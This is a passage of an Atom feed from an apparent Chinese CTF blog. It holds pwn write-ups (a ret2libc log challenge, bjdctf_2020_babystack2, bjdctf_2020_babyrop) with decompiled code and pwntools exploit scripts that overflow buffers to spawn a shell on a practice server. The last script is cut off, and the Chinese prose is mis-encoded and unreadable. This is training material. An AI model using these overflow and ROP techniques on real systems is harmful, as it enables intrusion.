    <id>https://www.fomal.cc/posts/1640936b.html</id>
    <published>2023-04-09T06:25:05.391Z</published>
    <updated>2023-04-09T06:22:22.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>ä¸€é“ret2libc1çš„é¢˜ç›®,ç¨å¾®ç»•äº†ä¸€æ­¥,çœ‹äº†ç­”æ¡ˆç°åœ¨å¤ç°ä¸€ä¸‹.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Display</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo Printing......&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>æƒ¯ä¾‹æŸ¥çœ‹é˜²æŠ¤,æ²¡æœ‰å¼€å¯PIEé˜²æŠ¤.çœ‹åç¼–è¯‘çš„ä»£ç ,å‘ç°<code>src</code>æ˜¯å…¨å±€å˜é‡,ç¨‹åºçš„åŠŸèƒ½æ˜¯è¾“å…¥è¾“å‡ºä¸€ä¸ªæ‰€è°“çš„æ—¥å¿—(ä¹Ÿå°±æ˜¯<code>src</code>),è¿™é‡ŒåŠŸèƒ½<code>getFlag()</code>å¹¶æ²¡æœ‰è¢«æ‰“å°åœ¨é€‰é¡¹ä¸­,å†…éƒ¨çš„<code>dest</code>åŠ ä¸Šä¸€ä¸ª<code>strcpy()</code>æœ‰æ ˆæº¢å‡ºçš„æ¼æ´,è¿™é‡Œæˆ‘ä»¬å…ˆé€‰æ‹©1æ·»åŠ æ—¥å¿—,ä¹Ÿå°±æ˜¯ç»™<code>src</code>è¾“å…¥,ç„¶åé€‰æ‹©åŠŸèƒ½4,å°±ç›¸å½“äºæˆ‘ä»¬å¯¹<code>dest</code>è¿›è¡Œäº†è¾“å…¥,é‚£ä¹ˆæ ¹æ®<code>dest</code>çš„ä½ç½®,æˆ‘ä»¬å¸ƒç½®ä¸€æ¡è°ƒç”¨<code>system(&quot;sh&quot;)</code>çš„ROPé“¾,å…ˆåŠŸèƒ½1è¾“å…¥åˆ°<code>src</code>,ç„¶åå†åŠŸèƒ½4å¤åˆ¶åˆ°<code>dest</code>,å°±å¯ä»¥è¦†ç›–è¿”å›åœ°å€äº†.è¿™é‡Œçš„<code>'sh\x00'</code>æ˜¯å› ä¸ºæœ‰<code>fflush()</code>å‡½æ•°,IDAè™½ç„¶æ²¡æŸ¥åˆ°<code>&quot;bin/sh&quot;</code>,ä¸è¿‡ROPgadgetå¯ä»¥æŸ¥åˆ°<code>'sh'</code>,ä¹Ÿå¯ä»¥æ‹¿æ¥ç”¨.æœ€åé™„ä¸Šexp.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn --string <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28862</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x48</span>+<span class="number">0x4</span></span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="number">0x80482EA</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>,<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;ä¸€é“ret2libc1çš„é¢˜ç›®,ç¨å¾®ç»•äº†ä¸€æ­¥,çœ‹äº†ç­”æ¡ˆç°åœ¨å¤ç°ä¸€ä¸‹.&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    <category term="å¤ç°" scheme="https://www.fomal.cc/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬”è®°</title>
    <link href="https://www.fomal.cc/posts/e1748931.html"/>
    <id>https://www.fomal.cc/posts/e1748931.html</id>
    <published>2023-04-09T06:25:05.379Z</published>
    <updated>2023-04-09T06:21:01.512Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>å°†ä¹‹å‰å­¦ä¹ è¿‡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹å®Œæ•´çš„è®°å½•æ€»ç»“ä¸‹æ¥.</p><h2 id="å‰ç½®åŸºç¡€çŸ¥è¯†æ¦‚è¿°">å‰ç½®åŸºç¡€çŸ¥è¯†æ¦‚è¿°</h2><p>ä¸è§„èŒƒçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼šäº§ç”Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´,åˆ©ç”¨è¿™ç§æ¼æ´å¯ä»¥è¾¾åˆ°ä»»æ„å†…å­˜è¯»å†™çš„ç›®çš„.</p><h2 id="å¿…è¦çš„æ³¨æ„äº‹é¡¹">å¿…è¦çš„æ³¨æ„äº‹é¡¹</h2><h3 id="1-è¦å¯»æ‰¾çš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ¬ä½“è€Œä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æŒ‡é’ˆ">1) è¦å¯»æ‰¾çš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ¬ä½“è€Œä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æŒ‡é’ˆ!</h3><h2 id="1-æ³„éœ²æ ˆä¸Šå†…å®¹">1.æ³„éœ²æ ˆä¸Šå†…å®¹</h2><h2 id="2-æ³„éœ²å…¶ä»–å†…å­˜çš„å†…å®¹">2.æ³„éœ²å…¶ä»–å†…å­˜çš„å†…å®¹</h2><h2 id="3-ä¿®æ”¹æ ˆä¸Šçš„å†…å®¹">3.ä¿®æ”¹æ ˆä¸Šçš„å†…å®¹</h2><h2 id="4-ä¿®æ”¹å…¶ä»–å†…å­˜çš„å†…å®¹">4.ä¿®æ”¹å…¶ä»–å†…å­˜çš„å†…å®¹</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;å°†ä¹‹å‰å­¦ä¹ è¿‡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹å®Œæ•´çš„è®°å½•æ€»ç»“ä¸‹æ¥.&lt;/p&gt;
&lt;h2 id=&quot;å‰ç½®åŸºç¡€çŸ¥è¯†æ¦‚è¿°&quot;&gt;å‰ç½®åŸºç¡€çŸ¥è¯†æ¦‚è¿°&lt;/h2&gt;
&lt;p&gt;ä¸è§„èŒƒçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼šäº§ç”Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´,åˆ©ç”¨è¿™ç§æ¼æ´å¯ä»¥è¾¾åˆ°ä»»æ„å†…å­˜è¯»å†™çš„ç›®çš„.&lt;/p&gt;</summary>
      
    
    
    
    <category term="ç¬”è®°" scheme="https://www.fomal.cc/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>bjdctf_2020_babystack2 WP</title>
    <link href="https://www.fomal.cc/posts/5afc574d.html"/>
    <id>https://www.fomal.cc/posts/5afc574d.html</id>
    <published>2023-04-08T09:41:50.275Z</published>
    <updated>2023-04-09T06:23:18.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>æ•´æ•°æº¢å‡ºçš„é€»è¾‘æ¼æ´å’Œret2textç»“åˆ,ç¬¬ä¸€æ¬¡åšæ•´æ•°æº¢å‡º.åˆå­¦äº†æ–°çš„æ‰‹æ³•.</p><h2 id="é€†å‘">é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>PIEå’Œcanaryæ²¡æœ‰æ‰“å¼€,åˆæœ‰ä¸ªåé—¨å‡½æ•°,åº”è¯¥æ˜¯ret2textäº†,ä¸è¿‡è¿™ä¸ªæ ˆæº¢å‡ºæ¼æ´ä¸å¥½åˆ©ç”¨,å¦‚æœæŒ‰ç€ç¨‹åºçš„é€»è¾‘æ¥æœ€å¤šä¹Ÿå°±è¯»å…¥10ä¸ªå­—ç¬¦,æ˜¾ç„¶æ˜¯ä¸å¤Ÿçš„,ä½†æ˜¯è¿™é‡Œåœ¨ä¸‹é¢çš„<code>read()</code>åˆæœ‰ä¸€ä¸ªæ•´æ•°æº¢å‡ºçš„æ¼æ´,åªè¦è¾“å…¥-1å°±å¯ä»¥è®©æ— ç¬¦å·æ•´æ•°<code>nbyts</code>æº¢å‡ºåˆ°æœ€å¤§å€¼,è¿™æ ·å°±å¯ä»¥æº¢å‡ºéå¸¸éå¸¸å¤šçš„å­—èŠ‚æ¥ç”¨åé—¨è¦†ç›–è¿”å›åœ°å€äº†,æœ€åé™„ä¸Šexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26177</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x10</span>+<span class="number">0x8</span></span><br><span class="line">backdoor=<span class="number">0x400726</span></span><br><span class="line">ret=<span class="number">0x400599</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span> ,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;æ•´æ•°æº¢å‡ºçš„é€»è¾‘æ¼æ´å’Œret2textç»“åˆ,ç¬¬ä¸€æ¬¡åšæ•´æ•°æº¢å‡º.åˆå­¦äº†æ–°çš„æ‰‹æ³•.&lt;/p&gt;
&lt;h2 id=&quot;é€†å‘&quot;&gt;é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>bjdctf_2020_babyrop WP</title>
    <link href="https://www.fomal.cc/posts/2dc4f22e.html"/>
    <id>https://www.fomal.cc/posts/2dc4f22e.html</id>
    <published>2023-04-07T12:52:11.552Z</published>
    <updated>2023-04-09T06:23:00.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""></h2><hr><h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>ç»å…¸çš„x64ä¸‹çš„ret2libc3é¢˜ç›®,æœ€è¿‘åšç®€å•é¢˜æœ‰ç‚¹éº»äº†,ä¸è¿‡è¿˜æ˜¯æœ‰ä¸€äº›å·¥å…·ä½¿ç”¨çš„å°ç»†èŠ‚å¯ä»¥ç§¯ç´¯çš„.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">100uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>åªæœ‰NXä¿æŠ¤,ç„¶åé€†å‘å‘ç°æ²¡æœ‰åˆ«çš„ä¸œè¥¿åªæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´,è€ƒè™‘ret2libc3æ‰‹æ³•,ä¹Ÿæ²¡æœ‰åˆ«çš„èŠ±æ´»,æ¶‰åŠåˆ°ä¸€äº›LibcSearcheræ›´æ–°çš„ä¸œè¥¿,å†™åœ¨ç¬”è®°é‡Œäº†,æœ€åé™„ä¸Šexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26669</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x20</span>+<span 